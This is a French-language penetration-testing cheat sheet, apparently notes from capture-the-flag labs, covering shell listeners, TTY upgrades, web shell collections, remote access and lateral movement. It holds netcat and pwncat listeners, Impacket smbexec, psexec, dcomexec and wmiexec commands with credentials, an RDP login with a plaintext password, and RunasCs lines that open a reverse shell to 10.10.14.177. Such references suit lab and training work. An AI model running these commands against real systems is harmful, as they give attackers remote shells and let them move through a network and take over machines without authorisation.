# Listeneur

## Netcat

```bash
nc -lnvp 1234
```

## Pwncat

```bash
pwncat-cs :4444
```

```bash
ctrl + D    # Vrai shell
privesc -l
```

## Shell stable

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
www-data@target$ ^Z

4th3n4x@kali[/]$ stty raw -echo
4th3n4x@kali[/]$ fg

[Enter]
[Enter]
www-data@target$

4th3n4x@kali[/]$ echo $TERM
xterm-256color

4th3n4x@htb[/htb]$ stty size
67 318

www-data@remotehost$ export TERM=xterm-256color
www-data@remotehost$ stty rows 67 columns 318
```

```bash
/bin/bash -i
perl —e 'exec "/bin/sh";'
```

## Meterpreter

```bash
shell
SHELL=/bin/bash script -q /dev/null
```

# Web Shell

```bash
$ laudanum       

> laudanum ~ Collection of injectable web files

/usr/share/laudanum
├── asp
├── aspx
├── cfm
├── helpers
├── jsp
├── php
└── wordpress
```

```bash
nishang/Antak-WebShell
```

```bash
[wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
```

# Connection à distance

## Winrm

```bash
evil-winrm
```

## RDP

```bash
xfreerdp /u:jim /p:'Castello1!' /v:172.16.114.30 /cert:ignore /drive:linux,/home/kali
```

# Impacket

## SMBexec

```bash
impacket-smbexec user:'pass123'@domaine.local
```

## PSexec
```bash
impacket-psexec user:'pass123'@domaine.local
```

## DCOMexec
```bash
impacket-dcomexec user:'pass123'@domaine.local
```

## WMIexec
```bash
impacket-wmiexec user:'pass123'@domaine.local
```

# Exécuter à la place d'un autre utilisateur

## Linux

```bash
sudo -u username command
```

## Windows

### PowerShell

```powershell
Start-Process -FilePath "path\to\command" -Credential (Get-Credential)
Start-Process "runas" -ArgumentList "/user:domain\username cmd.exe"
```

### Runas

```powershell
runas /user:domain\username "cmd.exe"
```

### RunasCS.exe

```powershell
runasCS.exe admin password "nc ip port"
./runas.exe mikasa IL0v3 powershell -r 10.10.14.177:1235